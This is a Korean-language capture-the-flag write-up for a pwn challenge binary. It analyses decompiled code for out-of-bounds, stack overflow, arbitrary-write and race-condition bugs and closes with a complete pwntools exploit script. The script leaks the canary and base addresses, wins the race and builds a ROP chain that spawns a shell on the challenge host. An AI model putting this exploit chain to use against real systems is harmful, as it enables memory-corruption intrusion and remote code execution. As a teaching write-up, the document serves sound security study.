
## 배경 및 공격 시나리오

본 문제에서 주어지는 바이너리는 보호기법인 Full RELRO, 카나리(Canary), Non-Executable stack (NX), Position Independent Executable (PIE)가 모두 적용되어 있습니다.

문제에서 주어지는 프로그램은 이용자로부터 문자열을 스택 메모리에 입력받습니다. `sub_1491` 함수를 가장 처음 실행했을 때 세 가지의 입력을 받게 되는데, 마지막에 입력받은 문자열을 암호화하는 기능을 제공합니다. 먼저 두 번째와 세 번째 입력에서 Out-Of-Bounds (OOB) 취약점이 존재하고, 해당 취약점을 이용하면 한 번의 ret2main이 가능합니다. 이 때 마지막 입력의 BOF를 이용하여 출력받은 암호화된 내용을 복호화하여 카나리, Stack Frame Pointer (SFP)를 알아낼 수 있습니다. 두 번째로 `sub_1491` 함수를 실행할 때 BOF를 이용하여 1/16확률로 `main`으로 돌아갈 수 있고, pie_base를 구할 수 있습니다. 세 번째는 `sub_1491` 함수 내부의 `nbytes`변수를 16으로 맞춰주는 코드로 돌아가서 `nbytes`를 16으로 설정하게끔 합니다. 네 번째와 다섯 번째 `sub_1491`함수에서는 `start_routine`에서의 AAW 취약점과 레이스 컨디션을 이용하여 `nbytes`변수의 값을 매우 크게 할 수 있고, 다섯 번째 `sub_1491`함수에서 드디어 ROP를 할 준비가 되었습니다. 초반부에 유출된 libc 값을 이용용하여 Address Space Layout Randomization (ASLR)을 무력화할 수 있고, 그대로 ROP를 진행하면 됩니다.

풀이자는 본 문제를 해결하면서 다양한 취약점을 한꺼번에 적용시키는 문제를 경험할 수 있습니다. 

## 프로그램 분석

### 바이너리 보호기법

바이너리의 보호기법은 다음과 같습니다.

```bash
[*] '/app/prob'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

### main 함수

`arg` 에 64바이트만큼을 할당합니다. 레이스컨디션을 위해서는 새로 메모리를 할당받으면 안 되기 때문에 `main`으로 돌아갈 때는 `malloc`이후로 돌아갈 것입니다. (`sub_12C9`는 initialize 함수입니다.)

```c
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  arg = (char *)malloc(0x40uLL);
  sub_12C9(64LL, a2);
  sub_1491();
  sleep(5u);
  return 0LL;
}
```
### 주요 함수1

본 문제에서 주어지는 바이너리의 첫 번째 핵심 함수는 `sub_1491`입니다. 중요하지 않은 출력함수를 제외한 디컴파일 결과는 다음과 같습니다. 코드를 살펴보면 네 가지 종류의 입력이 있습니다.
첫 번째 입력 :  `buf`에 `nbytes` 바이트만큼 입력을 받습니다(`nbytes`는 `.data` 영역에 존재하며 8이라는 값을 가지고 있습니다).
`qword_4060`가 0이 아니라면 두 번째와 세 번째 입력을 받습니다.
두 번째 입력 : `qword_4058`을 정수형으로 입력받습니다. `qword_4058`이 올바른 숫자이면 다음 입력으로 이동합니다.
세 번째 입력 : `qword_4060`을 정수형으로 입력받습니다.
`qword_4060` - 1을 인덱스로 하여 `qword_4058`을 더합니다.
네 번째 입력 : `src`에 42바이트만큼 입력을 받습니다.
`buf`와 `src`에 들어있는 값을 `arg`으로 옮깁니다. `buf`의 뒤쪽 절반을 지우고, `arg`에서도 같은 부분을 지웁니다. `start_routine`를 내장하고 있는 쓰레드를 호출합니다. `src`를 0으로 초기화하고 함수를 마무리합니다.

```c
unsigned __int64 sub_1491()
{
  pthread_t newthread; // [rsp+8h] [rbp-48h] BYREF
  __int64 v2[2]; // [rsp+10h] [rbp-40h]
  char buf[16]; // [rsp+20h] [rbp-30h] BYREF
  char src[24]; // [rsp+30h] [rbp-20h] BYREF
  unsigned __int64 v5; // [rsp+48h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  if ( ++qword_4050 == 0x7FFFFFFF )
  {
    puts("How did you run this 2147483647 times?\n");
    nbytes = 16LL;
  }
  puts("What's your name? : ");
  read(0, buf, nbytes);
  strncpy(arg, buf, (__int64)nbytes / 2);
  strncpy(&arg[(__int64)nbytes / 2], &buf[(__int64)nbytes / 2], (__int64)nbytes / 2);
  printf("Hello %s\n", buf);
  if ( qword_4060 )
  {
    puts("You already input your post code!");
  }
  else
  {
    puts("What is the post code where you live? : ");
    __isoc99_scanf("%lld", &qword_4058);
    if ( (unsigned int)sub_132E((unsigned int)qword_4058) )
    {
      puts("Your code is incorrect :(");
      exit(0);
    }
    puts("Where do you want to save your code?(1 or 2) : ");
    __isoc99_scanf("%lld", &qword_4060);
    v2[qword_4060 - 1] += qword_4058;
    printf("This is your post code\n%lld %lld\n", v2[0], v2[1]);
  }
  puts("Write a letter\n> ");
  read(0, src, 0x30uLL);
  strncpy(arg + 16, src, 0x30uLL);
  puts("Because privacy is important, I will remove second half of the names.");
  memset(&buf[(__int64)nbytes / 2], 0, (__int64)nbytes / 2);
  memset(&arg[(__int64)nbytes / 2], 0, (__int64)nbytes / 2);
  pthread_create(&newthread, 0LL, start_routine, arg);
  puts("Letter is also your privary, I will remove first half of the letter.");
  memset(src, 0, 0x19uLL);
  return v5 - __readfsqword(0x28u);
}
```

### 주요 함수2

본 문제에서 주어지는 바이너리의 두 번째 핵심 함수는 `start_routine`입니다. 디컴파일 결과는 다음과 같습니다. 코드를 살펴보면 3중 for문으로 `v7`이라는 암호화 key를 생성합니다. a1[1]의 주소에 a1[0]을 넣습니다. 이들은 `sub_1491` 함수에 있던 `buf`배열에 들어가 있는 값입니다. 그 후 `src`에 들어있던 값들을 위에서 생성한 key와 xor한 후 이를 출력합니다.

```c
int __fastcall start_routine(_QWORD **a1)
{
  int i; // [rsp+1Ch] [rbp-34h]
  int j; // [rsp+20h] [rbp-30h]
  int k; // [rsp+24h] [rbp-2Ch]
  int m; // [rsp+28h] [rbp-28h]
  int v6; // [rsp+2Ch] [rbp-24h]
  char v7; // [rsp+30h] [rbp-20h]
  char *s; // [rsp+38h] [rbp-18h]

  v7 = 0;
  for ( i = 1; i <= 1001; ++i )
  {
    for ( j = 1; j <= 1001; ++j )
    {
      for ( k = 1; k <= 1001; ++k )
        v7 ^= k;
    }
  }
  s = (char *)(a1 + 2);
  if ( a1[1] )
    *a1[1] = *a1;
  v6 = strlen(s);
  for ( m = 0; m < v6; ++m )
    s[m] ^= v7;
  return printf("This is my amazing encrpytion's result!\n%s\n", s);
}
```
## 취약점 설명

### Out-Of-Bounds

`sub_1491`에서 값과 인덱스를 입력받아서 지정된 위치의 값을 더하는 기능을 제공하는데, 인덱스 범위가 제한되어 있지 않고, 바꿀 수 있는 값이 -16 ~ 16으로  설정되어 있어 임의의 메모리를 조작할 수 있는 취약점이 있습니다.

```c
unsigned __int64 sub_1491()
{
  ...
  if ( qword_4060 )
  { //puts
  }
  else
  {
    puts("What is the post code where you live? : ");
    __isoc99_scanf("%lld", &qword_4058);
    if ( (unsigned int)sub_132E((unsigned int)qword_4058) )
    {
      ...
    }
    puts("Where do you want to save your code?(1 or 2) : ");
    __isoc99_scanf("%lld", &qword_4060);
    v2[qword_4060 - 1] += qword_4058;
    printf("This is your post code\n%lld %lld\n", v2[0], v2[1]);
  }
  ...
}
```

### Buffer-Overflow

`sub_1491`에서 `src`의 값을 입력 받는 과정에서 48바이트의 입력을 받습니다. `src`가 할당받은 크기는 24바이트이므로, 작은 범위의 BOF가 발생합니다.

```c
unsigned __int64 sub_1491()
{
  ...
  char src[24]; // [rsp+30h] [rbp-20h] BYREF
  ...
  read(0, src, 0x30uLL);
  strncpy(arg + 16, src, 0x30uLL);
  ...
}
```

### Arbitrary-Address-Write

`start_routine`에서 a1[1]이 0이 아니라면 a1에 저장되어 있는 값들을 이용하여 어떤 주소에 값을 쓰기 때문에 임의 주소 쓰기 취약점이 발생합니다.

```c
int __fastcall start_routine(_QWORD **a1)
{
  ...
  if ( a1[1] )
    *a1[1] = *a1;
  ...
}
```

### Race-Condition

`start_routine`에서 약 10억 번의 작업을 실행하며, 수행 시간이 1초가 넘습니다. 이 작업은 쓰레드에서 진행되기 때문에 본 프로그램은 정상적으로 돌아갑니다. 만약 `sub_1491`를 다시 실행할 수 있다면, `a1`의 처음 16바이트를 마음대로 쓸 수 있기 때문에, AAW 취약점을 이용할 수 있습니다.

```c
int __fastcall start_routine(_QWORD **a1)
{
  int i; // [rsp+14h] [rbp-3Ch]
  int j; // [rsp+18h] [rbp-38h]
  int k; // [rsp+1Ch] [rbp-34h]
  int m; // [rsp+20h] [rbp-30h]
  int v6; // [rsp+24h] [rbp-2Ch]
  char v7; // [rsp+28h] [rbp-28h]
  char *s; // [rsp+38h] [rbp-18h]

  v7 = 0;
  for ( i = 1; i <= 1001; ++i )
  {
    for ( j = 1; j <= 1001; ++j )
    {
      for ( k = 1; k <= 1001; ++k )
        v7 ^= k;
    }
  }
  ...
}

unsigned __int64 sub_1491()
{
  pthread_t newthread; // [rsp+8h] [rbp-48h] BYREF
  __int64 v2[2]; // [rsp+10h] [rbp-40h]
  char buf[16]; // [rsp+20h] [rbp-30h] BYREF
  ...
  puts("What's your name? : ");
  read(0, buf, nbytes);
  strncpy(arg, buf, (__int64)nbytes / 2);
  strncpy(&arg[(__int64)nbytes / 2], &buf[(__int64)nbytes / 2], (__int64)nbytes / 2);
  printf("Hello %s\n", buf);
  ...
}
```

## 익스플로잇 시나리오

`sub_1491`를 몇 번째 실행 중인가에 따라 나누었습니다.

1. **canary & SFP leak**

OOB를 이용하여 `main`함수 쪽으로 이동하도록 RET을 변경하고, `src`에서의 BOF를 이용하여 카나리와 SFP를 알아냅니다. 복호화를 해야 함을 까먹지 않습니다. 

2. **PIE 베이스 주소 구하기**

PIE_base를 모르지만, 함수 주소의 아래 세 바이트는 일정하다는 점을 이용하여 `main`함수 쪽으로 돌아가게 할 수 있습니다. 1/16확률입니다. try_except 구문을 이용하여 구현하면 좀 더 수월합니다. 이번 BOF를 통해 PIE_base를 구할 수 있습니다.

3. **`nbytes` 16으로 늘리기**

`sub_1491`에서 `nbytes`를 16으로 설정하는 if문 안쪽의 주소로 RET 값을 변경하여 `buf`에 입력할 수 있는 값의 길이를 길게 합니다. 여기부터 Race condition을 준비하는 것입니다.

여기서 저는 스택 구조가 꼬이는 게 너무 머리가 아파서 `main`쪽으로 한 번 더 이동했습니다.

4. **Race condition 준비**

Race condition으로 AAW 취약점을 적용하기 위해 `main`함수 쪽으로 돌아갑니다.

5. **AAW**

적당히 큰 수(ex 1028)를 앞에 놓고, `nbytes`의 주소를 뒤에 놓아 `nbytes`의 값을 변경합니다. 그 후는 주어진 libc를 이용해 ROP를 하면 됩니다.

## 익스플로잇 코드

아래 코드는 상기에서 설명한 시나리오대로 익스플로잇을 수행합니다. 익스 시나리오에서 이해가 되지 않은 부분은 코드의 주석을 통해 더 이해를 할 수 있을 것 같습니다.

```python
#!/usr/bin/env python3
from pwn import *

key = 0
for i in range(1, 1002):
    key ^= i # key = 1

def decrypt(s):
    str_new = list(s)
    for i in range(len(str_new)):
        a = str_new[i] ^ 1
        str_new[i] = a.to_bytes(1, 'big')
    str_new = b''.join(str_new)
    return str_new

while True :
    typ = 1
    p = 0
    if typ : p = remote('host3.dreamhack.games', 14490)
    else : p = process('./prob')
    e = ELF('./prob')
    l = ELF('./libc.so.6')

    try:
        #First sub_1491 - OOB, canary & SFP leak
        main_p = 0x00000000000017f9
        plus = main_p - 0x1808
        p.sendafter(b': \n', b'a') # s
        p.sendlineafter(b'live? : \n', str(plus))
        p.sendlineafter(b') : \n', str(10))

        #libc_base
        p.recvuntil(b'This is your post code\n')
        libc_p = p.recvline()[:-1].split(b' ')
        libc_base = int(libc_p[0].decode()) - 0x7ffff7fa96a0 + 0x7ffff7d8e000
        print('libc_base = ' + hex(libc_base))

        payload = b'a' * 0x19
        p.sendafter(b'> \n', payload) # buf

		p.recvuntil(b'result!\n')
        str1 = decrypt(p.recvline()[:-1])
        canary = u64(b'\x00' + str1[0x19:0x20])
        sfp = u64(str1[0x20:] + b'\x00' * 2)
        print(b'canary = ' + p64(canary))
        print('sfp = ' + hex(sfp))

        #Second sub_1491 - PIE_base leak
        p.send(b'a') #s
        payload = b'a' * 0x19 + p64(canary)[1:] + b'b' * 8 + p64(main_p)[:2]
        p.sendafter(b'> \n', payload) # buf
        p.recvuntil('name? : \n') # check_success_bof

        p.recvuntil(b'result!\n')
        str2 = decrypt(p.recvline()[:-1])[-6:]
        pie_base = u64(str2 + b'\x00' * 2) - main_p
        print('pie_base = ' + hex(pie_base))

        #Third sub_1491 - dword_4010 -> 16
        p.send(b'a') #s
        dword_p = pie_base + 0x00000000000014cd
        payload = b'a' * 0x19 + p64(canary)[1:] + p64(sfp - 0x600) + p64(dword_p)
        p.sendafter(b'> \n', payload) # buf

        #ret2main to prevent accidents
        p.recvuntil(b'result!\n') #wait for thread
        p.send(b'a') #s
        main = pie_base + main_p
        payload = b'a' * 0x19 + p64(canary)[1:] + p64(sfp - 0x680) + p64(main)
        p.sendafter(b'>', payload) # buf

        #Fourth sub_1491 - Prepare for race condition
        p.recvuntil(b'result!\n') #wait for thread
        p.send(b'a') #s
        payload = b'a' * 0x19 + p64(canary)[1:] + p64(sfp - 0x700) + p64(main)
        p.sendafter(b'>', payload) # buf

        #Fifth sub_1491 - do AAW
        #No time to wait for thread
        read_n = pie_base + 0x4010
        payload = p64(1028) + p64(read_n)
        p.sendafter(b' : \n', payload) #s
        p.interactive() # wait for thread

        #do ROP
        payload = b'a' * 0x19 + p64(canary)[1:] + p64(sfp - 0x780) + p64(main)
        p.send(payload) # buf

        ret = pie_base + 0x000000000000101a
        system_p = libc_base + l.symbols['system']
        bin_sh = libc_base + list(l.search(b'/bin/sh'))[0]
        pop_rdi = libc_base + 0x000000000002a3e5

        payload = b'a' * 0x8 + p64(0) + b'a' * 0x18 + p64(canary) + p64(sfp - 0x800) + p64(pop_rdi) + p64(bin_sh) + p64(ret) + p64(system_p)
        p.send(payload) #s
        p.sendafter(b'>', b'a') # buf

        p.interactive()
        p.close()
    except EOFError:
        print("EOFError")
        p.close()
    except struct.error:
        print("structError")
        p.close()
```

## 주의할 점

- OOB 취약점에서 (입력값 - 1)을 인덱스로 한다는 것을 주의합니다.
- libc leak은 대놓고 줄려는 의도입니다. `buf`배열의 출력으로도 구할 수 있지만 이 모든 취약점을 해낸 풀이자가 그 쉬운 leak을 못하지 않을 것이라고 생각해 꼬아놓지 않았습니다.
- 키를 구하기 위해서 1001 * 1001 * 1001 번을 직접 돌리지 않아도 됩니다. 같은 값을 두 번 xor하면 xor 하지 않은 것과 같은 점을 고려하여 1001 번만 돌려봐도 key값이 도출됩니다.
- key값은 1입니다.
- 레이스 컨디션 특성상 빠르게 입력하지 않으면 익스가 안 될 수 있습니다. 넉넉잡아 10억 번의 연산을 수행하게 해놨지만 그래도 빠르게 입력을 보내는 것이 옳습니다.
- ROP를 하다가 메모리를 잘못 건들이면 `Segmentation Fault`가 발생하기 때문에 이를 유의합니다.
- `nbytes`의 절반만큼 0으로 초기화하기 때문에 `nbytes`를 작게 설정한 경우 ROP가 제대로 진행되지 않을 수 있습니다.

## 레퍼런스

- [RELRO](https://dreamhack.io/lecture/courses/99)
- [카나리(Canary)](https://dreamhack.io/lecture/courses/112)
- [Non-Executable stack (NX)](https://dreamhack.io/lecture/courses/50)
- [Position Independent Executable (PIE)](https://dreamhack.io/lecture/courses/113)
- [Out-Of-Bounds (OOB)](https://dreamhack.io/lecture/courses/115)
- [Address Space Layout Randomization (ASLR)](https://dreamhack.io/lecture/courses/85)
- [스택 버퍼 오버플로(Stack Buffer Overflow)](https://dreamhack.io/lecture/courses/60)
- [Race-Condition](https://en.wikipedia.org/wiki/Race_condition)